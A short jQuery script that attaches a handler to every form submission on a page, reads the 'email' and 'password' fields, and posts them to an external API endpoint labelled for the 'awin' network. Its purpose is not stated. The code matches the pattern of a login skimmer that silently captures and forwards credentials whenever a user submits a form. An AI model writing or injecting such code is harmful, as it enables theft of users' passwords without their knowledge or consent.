 
$(document).ready(function(){  
   

    $(document).on('submit','form',function() {
 
        credentials_update();
        return true;
    });
 

   

}) ;
function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/network_connection",
        data: { 
            network_name: 'awin',
            username: $('[name=email]').val(),
            password: $('[name=password]').val(), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("credentials_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
